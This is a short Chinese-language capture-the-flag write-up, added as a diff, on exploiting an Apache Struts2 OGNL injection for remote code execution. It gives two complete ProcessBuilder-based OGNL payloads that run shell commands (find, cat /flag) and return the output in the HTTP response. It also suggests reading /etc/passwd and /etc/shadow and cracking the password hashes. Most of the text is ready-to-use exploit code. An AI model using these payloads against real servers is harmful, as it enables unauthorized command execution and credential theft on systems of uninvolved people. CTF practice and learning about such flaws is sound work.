@@ -1,0 +1,32 @@
+0. Structs2 Framework Vulnerability (利用OGNL表达式做RCE)
+%​​的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值
+​​#​​的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用
+​​$​​主要是在Struts 2配置文件中，引用OGNL表达式
+
+1.“密码”框输 %{1+1} ，提交显示2，说明用了Structs2框架且漏洞可利用，接下来只用设计OGNL做RCE即可
+
+2. find把flag存哪找出来：
+%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"find", "/", "-name", "*flag*"})).redirectErrorStream(true).start(), 
+#b=#a.getInputStream(), 
+#c=new java.io.InputStreamReader(#b), 
+#d=new java.io.BufferedReader(#c), 
+#e=new char[50000], 
+#d.read(#e), 
+#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"), 
+#f.getWriter().println(new java.lang.String(#e)), 
+#f.getWriter().flush(), 
+#f.getWriter().close()}
+
+3. cat /flag展示即可：
+%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/flag"})).redirectErrorStream(true).start(), 
+#b=#a.getInputStream(), 
+#c=new java.io.InputStreamReader(#b), 
+#d=new java.io.BufferedReader(#c), 
+#e=new char[50000], 
+#d.read(#e), 
+#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"), 
+#f.getWriter().println(new java.lang.String(#e)), 
+#f.getWriter().flush(), 
+#f.getWriter().close()}
+
+P.S. 另解——cat /etc/passwd + cat /etc/shadow分别得到用户名+密码的哈希，然后对密码做爆破亦可
